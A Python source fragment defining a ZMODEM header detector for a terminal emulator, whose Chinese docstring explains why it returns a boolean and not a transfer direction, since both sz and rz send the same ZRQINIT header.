class ZmodemDetector:
    """Chunk-boundary-safe ZMODEM header detector."""

    def __init__(self) -> None:
        self._tail = b""

    def feed(self, data: bytes) -> bool:
        """True when a ZMODEM header shows up in this chunk.

        **刻意不返回方向。** 原来返回 ``"upload"`` / ``"download"``，判据是
        「``B0`` 就算上传、``B1`` 就算下载」—— **那是错的**。``B0`` 是
        ZRQINIT，也就是"我要开始一次传输"，而**远端的 ``rz``（收）和 ``sz``
        （发）发的是同一个 ZRQINIT**；``B1`` 是 ZRINIT，是**收**的那一侧发出来
        的，于是按字面读反而与实际方向相反。方向只有两样东西知道：发起传输的
        那一方（工具栏按钮 / 终端里敲的命令），以及用户。

        改成返回 ``bool`` 是让**类型**本身挡住这个误解：调用方拿不到一个能
        冒充方向的字符串。真机实测 `sz` 与 `rz` 都发 `**\\x18B0…`，按老逻辑
        敲 `sz` 会被判成上传 —— 也就是"两个发送方对着干、什么都不发生"。
        """
        if not data:
            return False
        buf = self._tail + data
        m = _ZMODEM_HEADER.search(buf)
        # keep just enough to complete a header split across the next chunk
        self._tail = buf[-_TAIL_MAX:] if len(buf) > _TAIL_MAX else buf
        return m is not None

    def reset(self) -> None:
        self._tail = b""


def find_zmodem_trigger(data: bytes) -> bool:
    """One-shot convenience wrapper around :class:`ZmodemDetector`."""
    return ZmodemDetector().feed(data)


def looks_like_zmodem_header(data: bytes) -> bool:
    """Heuristic: did the remote just send a ZMODEM hex header?"""
    return bool(_ZMODEM_HEADER.search(data or b""))
